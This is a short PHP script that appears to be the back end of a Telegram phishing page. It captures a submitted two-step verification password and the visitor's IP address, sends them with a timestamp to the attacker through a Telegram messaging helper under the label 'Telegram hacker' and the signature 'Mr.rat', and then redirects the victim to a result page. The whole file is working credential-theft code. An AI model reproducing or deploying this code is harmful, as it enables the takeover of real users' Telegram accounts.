<?php
include ("jdf.php");
if (!empty($_POST)) {
    require_once 'Telegram.php';

    Telegram::sendMessage('🔐 تلگرام هکر 🔐'."\n".'➖➖➖➖➖➖➖➖➖➖'."\n".'🔸رمز دو مرحله ای:'.$_POST['Password']."\n".'➖➖➖➖➖➖➖➖➖➖'."\n".'📱آیدی:'.$_SERVER['REMOTE_ADDR']."\n".'⏱ساعت:'.jdate("h:i:s a")."\n".'⏰تاریخ:'.jdate('l Y F ')."\n".'➖➖➖➖➖➖➖➖➖➖'."\n".''."\n".'🆔 Mr.rat');


}

header ('Location: result.html');

?>

